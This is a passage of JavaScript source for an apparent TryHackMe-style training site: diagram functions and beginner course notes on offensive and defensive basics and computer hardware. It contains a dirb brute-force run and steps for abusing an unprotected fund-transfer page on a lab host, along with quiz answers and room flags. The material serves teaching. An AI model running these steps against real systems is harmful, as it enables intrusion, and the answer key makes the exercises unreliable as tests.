    <g transform="translate(20, 105)">
      <rect class="box" x="0" y="0" width="100" height="45" rx="4"/>
      <text x="50" y="20" font-size="10" font-weight="700">Action</text>
      <text class="sm" x="50" y="35">alert / drop</text>

      <rect class="box" x="110" y="0" width="110" height="45" rx="4"/>
      <text x="165" y="20" font-size="10" font-weight="700">Addresses</text>
      <text class="sm" x="165" y="35">Source -> Dest</text>

      <rect class="box" x="230" y="0" width="130" height="45" rx="4"/>
      <text x="295" y="20" font-size="10" font-weight="700">Port Target</text>
      <text class="sm" x="295" y="35">Port 21 (FTP)</text>

      <rect class="box" x="370" y="0" width="170" height="45" rx="4"/>
      <text x="455" y="20" font-size="10" font-weight="700">Content Match</text>
      <text class="sm" x="455" y="35">Byte / String Pattern</text>

      <rect class="box" x="550" y="0" width="170" height="45" rx="4"/>
      <text x="635" y="20" font-size="10" font-weight="700">Unique Identifier</text>
      <text class="sm" x="635" y="35">sid: Snort Rule ID</text>
    </g>`);
}

function ciaTriadSVG(){
  return dg("cia", "0 0 740 210", `
    <!-- Confidentiality -->
    <g transform="translate(30, 20)">
      <rect class="box acc" x="0" y="0" width="200" height="170" rx="8"/>
      <text x="100" y="32" font-weight="700" fill="var(--accent)">CONFIDENTIALITY</text>
      <text class="sm" x="100" y="54">Privacy &amp; Secrecy</text>
      <rect class="box" x="15" y="75" width="170" height="26" rx="4"/>
      <text x="100" y="92" font-size="11">Data Encryption (AES, TLS)</text>
      <rect class="box" x="15" y="108" width="170" height="26" rx="4"/>
      <text x="100" y="125" font-size="11">Access Control &amp; MFA</text>
      <text class="sm" x="100" y="156" fill="#f87171">Opposite: Disclosure</text>
    </g>

    <!-- Integrity -->
    <g transform="translate(270, 20)">
      <rect class="box acc" x="0" y="0" width="200" height="170" rx="8"/>
      <text x="100" y="32" font-weight="700" fill="#38bdf8">INTEGRITY</text>
      <text class="sm" x="100" y="54">Trustworthiness &amp; Truth</text>
      <rect class="box" x="15" y="75" width="170" height="26" rx="4"/>
      <text x="100" y="92" font-size="11">Cryptographic Hashing</text>
      <rect class="box" x="15" y="108" width="170" height="26" rx="4"/>
      <text x="100" y="125" font-size="11">Digital Signatures &amp; ACL</text>
      <text class="sm" x="100" y="156" fill="#f87171">Opposite: Alteration</text>
    </g>

    <!-- Availability -->
    <g transform="translate(510, 20)">
      <rect class="box acc" x="0" y="0" width="200" height="170" rx="8"/>
      <text x="100" y="32" font-weight="700" fill="#f59e0b">AVAILABILITY</text>
      <text class="sm" x="100" y="54">Uptime &amp; Access</text>
      <rect class="box" x="15" y="75" width="170" height="26" rx="4"/>
      <text x="100" y="92" font-size="11">Redundancy &amp; Backups</text>
      <rect class="box" x="15" y="108" width="170" height="26" rx="4"/>
      <text x="100" y="125" font-size="11">DDoS Shielding &amp; HA</text>
      <text class="sm" x="100" y="156" fill="#f87171">Opposite: Denial</text>
    </g>`);
}

function defenseInDepthSVG(){
  return dg("did", "0 0 740 160", `
    <g transform="translate(10, 20)">
      <rect class="box" x="0" y="20" width="130" height="90" rx="8"/>
      <text x="65" y="50" font-weight="700">1. Perimeter</text>
      <text class="sm" x="65" y="72">Firewalls</text>
      <text class="sm" x="65" y="90">DDoS Protection</text>
    </g>

    <line class="arr" x1="145" y1="65" x2="160" y2="65" marker-end="url(#ah-did)"/>

    <g transform="translate(165, 20)">
      <rect class="box" x="0" y="20" width="130" height="90" rx="8"/>
      <text x="65" y="50" font-weight="700">2. Network</text>
      <text class="sm" x="65" y="72">VLAN Segments</text>
      <text class="sm" x="65" y="90">NIDS / Snort</text>
    </g>

    <line class="arr" x1="300" y1="65" x2="315" y2="65" marker-end="url(#ah-did)"/>

    <g transform="translate(320, 20)">
      <rect class="box" x="0" y="20" width="130" height="90" rx="8"/>
      <text x="65" y="50" font-weight="700">3. Endpoint</text>
      <text class="sm" x="65" y="72">EDR / Antivirus</text>
      <text class="sm" x="65" y="90">Host Hardening</text>
    </g>

    <line class="arr" x1="455" y1="65" x2="470" y2="65" marker-end="url(#ah-did)"/>

    <g transform="translate(475, 20)">
      <rect class="box" x="0" y="20" width="125" height="90" rx="8"/>
      <text x="62" y="50" font-weight="700">4. Application</text>
      <text class="sm" x="62" y="72">WAF, Input Check</text>
      <text class="sm" x="62" y="90">Auth &amp; RBAC</text>
    </g>

    <line class="arr" x1="605" y1="65" x2="620" y2="65" marker-end="url(#ah-did)"/>

    <g transform="translate(625, 20)">
      <rect class="box acc" x="0" y="10" width="105" height="110" rx="8"/>
      <text x="52" y="42" font-weight="700">5. DATA</text>
      <text class="sm" x="52" y="65">Core Asset</text>
      <text class="sm" x="52" y="85">Encryption</text>
      <text class="sm" x="52" y="105">Backups</text>
    </g>`);
}

function owaspMatrixSVG(){
  return dg("owasp", "0 0 740 200", `
    <!-- Pillar 1 -->
    <g transform="translate(15, 15)">
      <rect class="box acc" x="0" y="0" width="225" height="170" rx="8"/>
      <text x="112" y="30" font-weight="700" fill="var(--accent)">IAAA Failures</text>
      <text class="sm" x="112" y="50">Identity &amp; Access Controls</text>
      <rect class="box" x="10" y="65" width="205" height="28" rx="4"/>
      <text x="112" y="83" font-size="10.5">A01: Broken Access Control</text>
      <rect class="box" x="10" y="99" width="205" height="28" rx="4"/>
      <text x="112" y="117" font-size="10.5">A07: Identification &amp; Auth</text>
      <rect class="box" x="10" y="133" width="205" height="28" rx="4"/>
      <text x="112" y="151" font-size="10.5">A09: Logging &amp; Monitoring</text>
    </g>

    <!-- Pillar 2 -->
    <g transform="translate(258, 15)">
      <rect class="box acc" x="0" y="0" width="225" height="170" rx="8"/>
      <text x="112" y="30" font-weight="700" fill="#38bdf8">Application Design</text>
      <text class="sm" x="112" y="50">Code Logic &amp; Architecture</text>
      <rect class="box" x="10" y="60" width="205" height="24" rx="4"/>
      <text x="112" y="76" font-size="10.5">A02: Cryptographic Failures</text>
      <rect class="box" x="10" y="88" width="205" height="24" rx="4"/>
      <text x="112" y="104" font-size="10.5">A03: Injection (SQLi / Cmd)</text>
      <rect class="box" x="10" y="116" width="205" height="24" rx="4"/>
      <text x="112" y="132" font-size="10.5">A06: Outdated Components</text>
      <rect class="box" x="10" y="144" width="205" height="24" rx="4"/>
      <text x="112" y="160" font-size="10.5">A10: SSRF Request Forgery</text>
    </g>

    <!-- Pillar 3 -->
    <g transform="translate(500, 15)">
      <rect class="box acc" x="0" y="0" width="225" height="170" rx="8"/>
      <text x="112" y="30" font-weight="700" fill="#f59e0b">Insecure Data Handling</text>
      <text class="sm" x="112" y="50">Configuration &amp; Integrity</text>
      <rect class="box" x="10" y="65" width="205" height="28" rx="4"/>
      <text x="112" y="83" font-size="10.5">A04: Insecure Design</text>
      <rect class="box" x="10" y="99" width="205" height="28" rx="4"/>
      <text x="112" y="117" font-size="10.5">A05: Security Misconfiguration</text>
      <rect class="box" x="10" y="133" width="205" height="28" rx="4"/>
      <text x="112" y="151" font-size="10.5">A08: Software/Data Integrity</text>
    </g>`);
}


const COURSES = {
  "pre-security": {
    title:"Pre Security", icon:"🌱", level:"easy", track:"Foundations",
    summary:"To attack or defend any technology, you first need to understand what powers it. Explore computer basics, write your first lines of code, and discover how networking, the web, and real world cyber attacks all connect. Your cyber security journey starts here!",
    prerequisites:"No prior knowledge needed. Just enthusiasm and excitement to learn!",
    modules:[
      {icon:"💻", title:"Introduction to Cyber Security", text:"Understand what is offensive and defensive security, and learn about careers available in cyber.",
       intro:"Explore both offensive and defensive security. Start by learning basic offensive security concepts, where you will hack a vulnerable online-banking application. Get exposure to defensive security and protect a system by blocking an ongoing cyber attack. In this module, you will also learn about the different careers within cyber security.",
       rooms:[
        {name:"Offensive Security Intro", text:"Hack your first website (legally in a safe environment) and experience an ethical hacker's job.",
         icon:"🗡️", level:"easy", time:"15 min",
         tasks:[
          {title:"Think like a Hacker!", notes:`
            <p>What is <b>Offensive Security</b>? Often referred to as ethical hacking or red teaming, offensive security is the discipline of proactively discovering vulnerabilities, exploiting architectural flaws, and bypassing security defenses using the exact techniques deployed by real-world adversaries.</p>
            <p>While defensive security designs firewalls and locks, offensive security tests those locks against lockpicks. By identifying and proving that a weakness can be exploited before malicious threat actors find it, organizations can fix their flaws and protect sensitive customer records.</p>
            ${offensiveWorkflowSVG()}
            <h3>The Ethical &amp; Legal Framework</h3>
            <p>The decisive distinction between an ethical penetration tester and a malicious cyber criminal is <b>authorization</b>. Ethical hackers always operate with signed <i>Rules of Engagement (RoE)</i> and explicit written consent from the system owner. Hacking, probing, or scanning systems without permission is strictly illegal under computer misuse legislation.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Which term describes simulating a hacker's actions to find weaknesses?</i> <b>Offensive Security</b></li>
            </ul>`},

          {title:"Starting the Lab", lab:true, notes:`
            <p>In this hands-on lab, we target a simulated financial institution called <b>FakeBank</b> running at <code>http://fakebank.thm</code>.</p>
            <p>When launching the in-browser lab desktop, you are provided with a dedicated penetration testing workspace equipped with a web browser, terminal, and security auditing tools. Opening the browser to the customer portal displays your current account balance and profile details.</p>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>What is the bank account number in the FakeBank application?</i> <b>1245-8811</b></li>
            </ul>`},

          {title:"Find Hidden Pages", lab:true, notes:`
            <p>Websites typically conceal administrative portals, debugging dashboards, and staff backends from public navigation bars. To discover these hidden paths, ethical hackers use <b>Directory Brute-Forcing</b>.</p>
            <p>Tools like <code>dirb</code>, <code>gobuster</code>, and <code>ffuf</code> use wordlists containing thousands of common endpoint names (such as <code>/admin</code>, <code>/uploads</code>, <code>/backup</code>). They issue automated HTTP requests to each path and inspect the resulting HTTP status code:</p>
            <ul>
              <li><b>200 OK:</b> The resource exists and is accessible.</li>
              <li><b>301 / 302 Redirect:</b> The path redirects to another location (e.g. login).</li>
              <li><b>403 Forbidden:</b> The directory exists but permissions are restricted.</li>
              <li><b>404 Not Found:</b> The page does not exist.</li>
            </ul>
            <h3>Running dirb in the Terminal</h3>
            <pre><code>user@thm-attacker:~$ dirb http://fakebank.thm
-----------------
DIRB v2.22    
By DarkRaider 
-----------------
START_TIME: Wed Oct 14 11:20:01
URL_BASE: http://fakebank.thm/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

GENERATED WORDS: 4612

---- Scanning URL: http://fakebank.thm/ ----
==> DIRECTORY: http://fakebank.thm/images/
+ http://fakebank.thm/bank-transfer (CODE:200|SIZE:1542)
-----------------
END_TIME: Wed Oct 14 11:20:14
DOWNLOADED: 4612 - FOUND: 2</code></pre>
            <p><b>Room question:</b></p>
            <ul>
              <li><i>Dirb found one URL, http://fakebank.thm/images. What is the other hidden URL?</i> <b>http://fakebank.thm/bank-transfer</b></li>
            </ul>`},

          {title:"Attack the Admin Page", lab:true, notes:`
            <p>Navigating to the discovered <code>http://fakebank.thm/bank-transfer</code> URL reveals an unauthenticated internal fund routing panel. This vulnerability is classified as <b>Broken Access Control (OWASP Top 10 A01)</b>, because sensitive administrative functionality was left exposed without requiring password authentication or role checks.</p>
            <h3>Executing the Transfer</h3>
            <p>Inside the transfer form:</p>
            <ol>
              <li>Select the target holding account to debit funds from.</li>
              <li>Enter your personal account number: <code>1245-8811</code>.</li>
              <li>Set the transfer amount to <code>$2,000</code>.</li>
              <li>Click <b>Submit Transfer</b>.</li>
            </ol>
            <p>The transaction completes immediately, crediting your account and turning your balance positive. A congratulatory notification pops up confirming the objective was achieved.</p>
            <p class="callout"><b>Room Flag:</b> <code>BANK-HACKED</code></p>`}
         ]},

        {name:"Defensive Security Intro", text:"Introducing defensive security and related topics, such as Threat Intelligence, SOC, DFIR, Malware Analysis, and SIEM.",
         icon:"🛡️", level:"easy", time:"20 min",
         tasks:[
          {title:"Think like a Defender", notes:`
            <p><b>Defensive Security</b> (commonly known as <b>Blue Teaming</b>) is the operational practice of safeguarding systems, networks, and data from attacks, unauthorized access, and exfiltration.</p>
            <p>While offensive security identifies vulnerabilities through simulated attacks, defensive security builds, tunes, and operates the protective layers needed to withstand attacks around the clock.</p>
            ${defensivePillarsSVG()}
            <h3>Core Areas of Defensive Security</h3>
            <ul>
              <li><b>Security Operations Center (SOC):</b> 24/7 monitoring and triaging of live alerts across network and endpoints.</li>
              <li><b>Digital Forensics &amp; Incident Response (DFIR):</b> Investigating breaches, analyzing disk and memory images, and restoring clean operations.</li>
              <li><b>Malware Analysis:</b> Reverse engineering malicious binaries in sandboxes to understand execution flow and extract Indicators of Compromise (IOCs).</li>
              <li><b>Threat Intelligence:</b> Tracking threat actors, adversary TTPs, and emerging vulnerabilities.</li>
            </ul>
            <p><b>Key Concept:</b> Which team focuses on defensive security? <b>Blue Team</b></p>`},

          {title:"Detect Suspicious Activity", lab:true, notes:`
            <p>In this scenario, you take on the role of Joe, a Security Operations Center (SOC) analyst monitoring an e-commerce platform.</p>
            <p>An anomalous spike in HTTP requests triggers an alert on the Web Application Firewall (WAF). Reviewing web server logs reveals a high volume of rapid automated requests originating from an external IP address targeting backend endpoints.</p>
            <pre><code>2026-10-14 09:14:22 [ALERT] High Request Volume Detected!
Source IP: 32.122.195.63  |  Country: Unknown  |  Requests/min: 420
Target: http://store.thm/admin / http://store.thm/backup.zip</code></pre>
            <p><b>Incident Finding:</b> Attacker IP Address: <b>32.122.195.63</b></p>`},

          {title:"Identify the Attack", lab:true, notes:`
            <p>Inspecting the telemetry logs from attacker IP <code>32.122.195.63</code> reveals thousands of sequential GET requests querying sensitive non-public directories:</p>
            <ul>
              <li><code>/robots.txt</code> (HTTP 200)</li>
              <li><code>/admin</code> (HTTP 403 Forbidden)</li>
              <li><code>/login.php</code> (HTTP 200)</li>
              <li><code>/backup.tar.gz</code> (HTTP 404)</li>
              <li><code>/config.bak</code> (HTTP 404)</li>
            </ul>
            <p>This reconnaissance activity is known as <b>Directory Brute-Forcing / URL Discovery</b>. The adversary is using automated wordlists to map the web server file hierarchy and look for unlinked files containing credentials or source code.</p>
            <p><b>Attack Classification:</b> <b>URL Discovery / Directory Brute-Forcing</b></p>`},

          {title:"Stop the Attack", lab:true, notes:`
            <p>To neutralize the threat before the adversary discovers an exploitable administrative vulnerability:</p>
            <ol>
              <li>Navigate to the Firewall Configuration console.</li>
              <li>Configure an active block rule targeting attacker IP <code>32.122.195.63</code>.</li>
              <li>Apply rate-limiting thresholds on the ingress gateway to curb future brute-force spikes.</li>
            </ol>
            <p>Once the rule takes effect, the attacker's TCP connection drops immediately, the server CPU utilization returns to baseline, and the incident resolution flag is revealed.</p>
            <p class="callout"><b>Room Flag:</b> <code>THM{DEFENSIVE_HERO}</code></p>`}
         ]},

        {name:"Careers in Cyber", text:"Learn about the different careers in cyber security.",
         icon:"💼", level:"easy", time:"25 min",
         tasks:[
          {title:"The Industry & Career Landscape", notes:`
            <p>The cybersecurity industry faces an unprecedented global workforce shortage, with over <b>3.5 million unfilled roles</b> worldwide. Organizations across every industry need skilled practitioners to protect critical infrastructure, personal data, and business operations.</p>
            <p>Cybersecurity is an open-door field: people from diverse professional backgrounds—IT support, software engineering, customer service, law enforcement, psychology, and self-taught enthusiasts—make successful career transitions every day.</p>
            <p>Unlike careers that demand traditional multi-year computer science degrees, cybersecurity places high value on <b>demonstrable hands-on skills</b>, practical labs, problem-solving ability, and recognized industry certifications.</p>`},

          {title:"Critical Missions & Infrastructure", notes:`
            <p>Cybersecurity is about protecting the systems society depends on every single second:</p>
            <ul>
              <li><b>Healthcare &amp; Hospitals:</b> Preventing ransomware from encrypting life-support telemetry, medical scanners, and patient records.</li>
              <li><b>Energy &amp; Utilities:</b> Securing power grids, water purification facilities, and nuclear plants from hostile cyber warfare operations.</li>
              <li><b>Financial Infrastructure:</b> Safeguarding ATMs, credit card processing networks, and national stock exchanges from fraudulent manipulation.</li>
              <li><b>Aviation &amp; Transportation:</b> Protecting air traffic control radar systems and railway signaling from unauthorized override.</li>
            </ul>`},

          {title:"Core Cybersecurity Roles", notes:`
            <p>Cybersecurity spans a wide spectrum of technical and strategic specializations:</p>
            <h3>1. Defensive Paths (Blue Team)</h3>
            <ul>
              <li><b>Security Analyst (SOC):</b> Monitors real-time telemetry, hunts anomalies, and isolates compromises.</li>
              <li><b>Incident Responder (DFIR):</b> Conducts rapid triage, forensics, root-cause investigation, and system recovery.</li>
              <li><b>Malware Analyst:</b> Dissects reverse-engineered executable binaries in isolated virtual sandboxes.</li>
            </ul>
            <h3>2. Offensive Paths (Red Team)</h3>
            <ul>
              <li><b>Penetration Tester:</b> Evaluates corporate networks and web applications for exploitable vulnerabilities under authorization.</li>
              <li><b>Red Teamer:</b> Emulates advanced persistent threats (APTs) using physical, social, and network vectors.</li>
            </ul>
            <h3>3. Engineering &amp; Strategic Paths</h3>
            <ul>
              <li><b>Security Engineer:</b> Builds and automates robust firewalls, SIEM pipelines, and cryptographic infrastructure.</li>
              <li><b>Governance, Risk, and Compliance (GRC):</b> Ensures alignment with security frameworks (ISO 27001, NIST, PCI-DSS).</li>
            </ul>`},

          {title:"Emerging Horizons & Career Quiz", notes:`
            <p>As technological innovation accelerates, new attack surfaces require specialized security practitioners:</p>
            <ul>
              <li><b>Cloud Security:</b> Protecting hyper-scale virtual infrastructure, container clusters (Kubernetes), and serverless microservices.</li>
              <li><b>AI &amp; Machine Learning Security:</b> Defending LLMs and neural networks from prompt injection, model poisoning, and data poisoning.</li>
              <li><b>IoT &amp; Operational Technology (OT):</b> Securing smart devices, medical implants, and industrial SCADA control systems.</li>
            </ul>
            <h3>Matching Passions to Cybersecurity Career Tracks</h3>
            <table>
              <tr><th>Your Passions &amp; Problem-Solving Style</th><th>Recommended Career Path</th></tr>
              <tr><td>Curious about how software breaks, puzzle solver, loves coding &amp; exploitation</td><td><b>Penetration Tester / Offensive Security</b></td></tr>
              <tr><td>Analytical, loves detective investigation, finding evidence, identifying patterns</td><td><b>SOC Analyst / Incident Responder</b></td></tr>
              <tr><td>Passionate about infrastructure, automation, cloud platforms, network architecture</td><td><b>Security Engineer / Cloud Security</b></td></tr>
              <tr><td>Enjoys communication, policy frameworks, business risk, and compliance</td><td><b>GRC Analyst / Information Security Manager</b></td></tr>
            </table>`}
         ]},
       ]},
      {icon:"🖥️", title:"Computer Fundamentals", intro:"This module covers the fundamentals of how computers work. You'll start by exploring what's inside a computer, the components that make it tick and how they work together. From there, you'll discover the different types of computers and their specialisations, learn how systems communicate with each other through client-server relationships, and explore how virtualisation lets us create multiple virtual machines from a single computer. The module wraps up with cloud computing, showing how virtualisation scales up to power the services we use every day.", text:"Before you can secure technology, you need to understand how it works. Explore what's inside a computer, from hardware basics to the cloud.",
       rooms:[
        {name:"Inside a Computer System", text:"This room covers the basic components of a computer system.",
         icon:"🖥️", level:"easy", time:"25 min",
         tasks:[
          {title:"Introduction: The Hardware Fortress", notes:`
            <p>To defend a fortress, a strategist must understand its walls, gates, towers, and hidden supply passages. In cyber security, the computer system is your fortress. Before you can analyze malware, harden operating systems, or investigate network breaches, you must understand the physical hardware components that power everyday computing.</p>
            <p>Every digital action—from browsing a webpage to compiling exploit payloads—is translated into electrical impulses executed by physical chips.</p>`},

          {title:"Hardware Components & Architecture", lab:true, notes:`
            <p>Computers consist of specialized modular hardware components connected across high-speed electrical buses on the <b>Motherboard</b>.</p>
            ${hardwareComponentsSVG()}
            <h3>Hardware to Human Body Analogy</h3>
            <table>
              <tr><th>Component</th><th>Human Body Analogy</th><th>Primary Function in Computing</th></tr>
              <tr><td><b>CPU (Central Processing Unit)</b></td><td>Brain</td><td>Executes instructions, arithmetic calculations, and program logic. Contains ALU, Control Unit, and L1/L2/L3 caches.</td></tr>
              <tr><td><b>RAM (Random Access Memory)</b></td><td>Short-term Memory</td><td>High-speed volatile workspace storing active processes and data. Empties instantly when power is lost.</td></tr>
              <tr><td><b>Storage (SSD / NVMe / HDD)</b></td><td>Long-term Memory</td><td>Non-volatile persistent storage retaining the operating system, applications, and user documents across power cycles.</td></tr>
              <tr><td><b>Motherboard</b></td><td>Skeleton &amp; Nervous System</td><td>Printed circuit board (PCB) housing chipsets, expansion buses (PCIe), and traces that link all components together.</td></tr>
              <tr><td><b>PSU (Power Supply Unit)</b></td><td>Heart</td><td>Converts high-voltage alternating current (AC) from wall outlets into steady, regulated direct current (DC) rails (+12V, +5V, +3.3V).</td></tr>
              <tr><td><b>GPU (Graphics Card)</b></td><td>Visual Cortex</td><td>Specialized processor containing thousands of parallel cores designed for rapid mathematical calculations, rendering, and cryptographic hashing.</td></tr>
            </table>
            <p class="callout"><b>Component Identification Challenge Flag:</b> <code>THM{4llpccomp0n3nts1d3nt1f13d}</code></p>`},

          {title:"What Happens When You Press the Start Button?", lab:true, notes:`
            <p>From the millisecond you press the power button on your case to the moment your desktop login screen appears, your computer executes a tightly orchestrated sequence of low-level initialization routines:</p>
            ${bootSequenceSVG()}
            <h3>The 6 Stages of Booting</h3>
            <ol>
              <li><b>1. Power Delivery:</b> The power switch signals the PSU to supply voltage. Once power stabilizes, the PSU sends a <i>Power Good</i> signal to the motherboard.</li>
              <li><b>2. Firmware Initialization:</b> The CPU wakes up and immediately jumps to a fixed memory address containing the <b>BIOS (Basic Input/Output System)</b> or modern <b>UEFI (Unified Extensible Firmware Interface)</b> stored on a non-volatile flash chip.</li>
              <li><b>3. POST (Power-On Self-Test):</b> The firmware performs a rapid diagnostic check to verify critical hardware: tests RAM integrity, detects CPU clocking, verifies keyboard presence, and checks PCIe bus links. Error beeps or motherboard debug LEDs indicate failures.</li>
              <li><b>4. Boot Device Selection:</b> Firmware reads its configured boot order (NVMe SSD, SATA drive, USB drive, or PXE network boot) to locate a bootable partition.</li>
              <li><b>5. Initiating the Bootloader:</b> Control transfers to the bootloader software (such as <b>Windows Boot Manager</b> or <b>GRUB</b> on Linux) located in the EFI System Partition (ESP) or Master Boot Record (MBR).</li>
              <li><b>6. Kernel Execution:</b> The bootloader loads the core operating system kernel into RAM, initializes system drivers, mounts root filesystems, and launches background user space services and graphical desktop managers.</li>
            </ol>
            <p class="callout"><b>Security Perspective:</b> <b>UEFI Secure Boot</b> uses digital signatures to verify that bootloader binaries have not been tampered with, defending against destructive bootkits and rootkits that attempt to compromise machines before the OS starts.</p>
            <p class="callout"><b>Boot Process Simulator Flag:</b> <code>THM{pc5ucce55fully5t4rt3d}</code></p>`},

          {title:"Hardware in Cyber Security & DFIR", notes:`
            <p>Why does computer hardware matter in cybersecurity operations?</p>
            <ul>
              <li><b>Digital Forensics &amp; Incident Response (DFIR):</b> Because RAM is volatile, investigators must extract live memory using tools like DumpIt or LiME <i>before</i> powering down a compromised host, capturing running malware processes, unencrypted passwords, and active network connections.</li>
              <li><b>Hardware Attacks:</b> Attackers with physical access can execute <b>DMA (Direct Memory Access)</b> attacks using malicious Thunderbolt devices or PCIe cards to dump RAM contents directly without CPU permission.</li>
              <li><b>Firmware Vulnerabilities:</b> Malicious actors target out-of-band management controllers like IPMI and BMC chips to maintain persistent hardware-level access undetectable by endpoint antivirus.</li>
            </ul>`}
         ]},

        {name:"Computer Types", text:"Explore the different types of computers, from laptops to the tiny chips inside your coffee machine.",
         icon:"💻", level:"easy", time:"20 min",
         tasks:[
          {title:"The Computing Spectrum", notes:`
            <p>When most people think of a "computer", they picture a laptop or a desktop PC with a monitor and keyboard. However, computing devices exist in hundreds of specialized physical form factors engineered for distinct operational requirements.</p>
            <p>From 64-core enterprise servers crunching bank records in air-conditioned datacenters to tiny 8-bit microcontrollers timing the heating coil in a smart toaster, computing power surrounds modern society.</p>
            <p>Understanding these hardware types is crucial in cybersecurity because each form factor presents unique attack vectors, constraints, and operating environments.</p>`},

          {title:"Desktops, Laptops, Workstations, and Servers", notes:`
            <h3>Desktop vs Laptop vs Workstation vs Server</h3>
            <table>
              <tr><th>Computer Type</th><th>Form Factor &amp; Ergonomics</th><th>Primary Use Case &amp; Hardware Specialization</th></tr>
              <tr><td><b>Laptop</b></td><td>Portable clamshell with integrated display, keyboard, trackpad, and battery</td><td>General productivity on the go. Balances performance, battery life, and thermal dissipation.</td></tr>
              <tr><td><b>Desktop</b></td><td>Stationary tower or small-form-factor chassis with external monitor and peripherals</td><td>Home and office computing. Highly modular, easy to upgrade and repair.</td></tr>
              <tr><td><b>Workstation</b></td><td>High-spec desktop engineered for technical, scientific, and creative workloads</td><td>Demanding precision tasks: 3D CAD modeling, video rendering, machine learning, and reverse engineering. Features multi-core CPUs, ECC memory, and workstation-grade GPUs.</td></tr>
              <tr><td><b>Server</b></td><td>Rackmount (1U/2U/4U) or blade chassis located in datacenters</td><td>Delivers centralized services, databases, websites, and files 24/7. Operates <i>headless</i> (without screen/keyboard), featuring redundant hot-swap power supplies and remote out-of-band management (IPMI/iDRAC).</td></tr>
            </table>
            <p><b>Key Distinctions:</b></p>
            <ul>
              <li><i>Which computer type usually runs without a dedicated screen and keyboard?</i> <b>Server (operates headless)</b></li>
              <li><i>What kind of computer with specialized components would one buy to carry out precision work?</i> <b>Workstation</b></li>
            </ul>`},

          {title:"Smartphones, Tablets, Embedded Systems, and IoT", notes:`
            <h3>Pocket-Sized &amp; Dedicated Computing Systems</h3>
            <table>
              <tr><th>Category</th><th>Architecture &amp; OS</th><th>Key Attributes &amp; Examples</th></tr>
              <tr><td><b>Smartphone</b></td><td>ARM System-on-Chip (SoC), iOS / Android</td><td>The most popular pocket-sized computer in the world. Combines CPU, GPU, neural processor, cellular baseband modem, and cryptographic secure enclave onto a single silicon die.</td></tr>
              <tr><td><b>Tablet</b></td><td>Touch-first slate form factor, iPadOS / Android</td><td>Bridging mobile portability with larger display canvases for digital media consumption, field inspections, and creative stylus input.</td></tr>
              <tr><td><b>Embedded Computer</b></td><td>Microcontrollers (MCU), RTOS / lightweight firmware</td><td>Dedicated computer built directly into a larger machine to perform a fixed, pre-programmed task (e.g. coffee machines, automobile anti-lock braking systems, microwave ovens).</td></tr>
              <tr><td><b>IoT (Internet of Things)</b></td><td>Network-connected embedded nodes, Linux/FreeRTOS</td><td>Physical devices with sensors and network connectivity streaming telemetry to cloud platforms (e.g. smart thermostats, connected surveillance cameras, smart lightbulbs).</td></tr>
            </table>
            <p><b>Key Distinctions:</b></p>
            <ul>
              <li><i>What is the currently most popular pocket-sized computer?</i> <b>Smartphone</b></li>
              <li><i>What kind of computer would you expect to find in a coffee machine?</i> <b>Embedded computer</b></li>
            </ul>`},

          {title:"Engineering Trade-Offs & Challenge Flag", lab:true, notes:`
            <p>Why isn't there one universal computer design? Hardware engineering involves strict physical tradeoffs:</p>
            <ul>
              <li><b>Processing Power vs. Power Consumption (TDP):</b> High-speed servers consume 1000+ Watts and require loud cooling fans; mobile and embedded systems must operate on milliwatts to survive for days on small batteries.</li>
              <li><b>Form Factor &amp; Environmental Resilience:</b> Industrial embedded devices must withstand extreme heat, vibration, and dust where conventional PCs would fail in minutes.</li>
              <li><b>Cost &amp; Complexity:</b> Equipping every home appliance with a quad-core desktop processor would make devices unaffordable and unnecessarily complex.</li>
            </ul>
            <h3>Matching Challenge Solution</h3>
            <p>Categorizing each real-world deployment scenario with its optimal computer type (Datacenter Server, Engineering Workstation, Mobile Smartphone, Appliance Microcontroller) unlocks the room completion flag:</p>
            <p class="callout"><b>Room Flag:</b> <code>THM{8_computer_types}</code></p>`},

          {title:"Attack Surfaces Across Computer Types", notes:`
            <p>From a cyber security standpoint, recognizing the computer type dictates your attack and defense methodology:</p>
            <ul>
              <li><b>Embedded / IoT Vulnerabilities:</b> IoT devices frequently suffer from weak security postures: hardcoded default vendor credentials, unencrypted firmware updates, and lack of patching mechanisms. Attackers recruit vulnerable embedded devices into massive distributed denial of service (DDoS) botnets (such as Mirai).</li>
              <li><b>Server Hardening:</b> Servers present large attack surfaces due to public listening services; they require rigorous firewall filtering, role-based access control, SSH key authentication, and continuous log forwarding to a SIEM.</li>
              <li><b>Mobile Security:</b> Mobile endpoints require mobile device management (MDM), app store sandboxing, biometric authentication, and strict app permissions to prevent data leakage.</li>
            </ul>`}
         ]},

        {name:"Client-Server Basics", text:"This room teaches the basics of the Client-Server model.",
         icon:"🤝", level:"easy", time:"20 min",
         tasks:[
          {title:"The Client-Server Paradigm", notes:`
            <p>When you browse to <code>tryhackme.com</code>, check your email, or stream music, your machine does not hold all that information locally. Instead, computing systems participate in structured relationships to request and deliver information across networks.</p>
            <p>The foundational paradigm that underpins virtually all internet communication is the <b>Client-Server Model</b>:</p>
            <ul>
              <li><b>Client:</b> The initiating party (web browser, mobile app, API client) that sends a request asking for a specific service or resource.</li>
              <li><b>Server:</b> The high-availability host that listens continuously for incoming requests, processes business logic, and serves responses back to clients.</li>
            </ul>`},

          {title:"The Pizza Delivery Analogy (IPs and Ports)", notes:`
            <p>To easily understand client-server communication, consider ordering a pizza delivery to your apartment:</p>
            ${clientServerPizzaSVG()}
            <ul>
              <li><b>Client:</b> You (Alice), making a phone call requesting a pepperoni pizza.</li>
              <li><b>Server:</b> The pizza parlor (Luigi's Pizza), receiving orders, baking pizzas, and dispatching deliveries.</li>
              <li><b>IP Address:</b> The street address of your apartment building. It tells delivery drivers which building to drive to across the city.</li>
              <li><b>Port Number:</b> The specific apartment number inside the building (e.g., Apt 80 or Apt 443). Without an apartment number, the driver reaches the building but cannot deliver to the right person.</li>
            </ul>
            <h3>Network Addressing &amp; Standard Ports</h3>
            <p>On a network, the <b>IP Address (Internet Protocol Address)</b> directs traffic to the correct host machine. Once the packet arrives at the system, the <b>Port Number</b> directs incoming data to the specific application or service listening for connections:</p>
            <table>
              <tr><th>Port Number</th><th>Standard Protocol / Service</th><th>Description</th></tr>
              <tr><td><b>Port 80</b></td><td>HTTP (Hypertext Transfer Protocol)</td><td>Unencrypted web traffic delivery</td></tr>
              <tr><td><b>Port 443</b></td><td>HTTPS (HTTP Secure / TLS)</td><td>Encrypted web traffic with TLS certificates</td></tr>
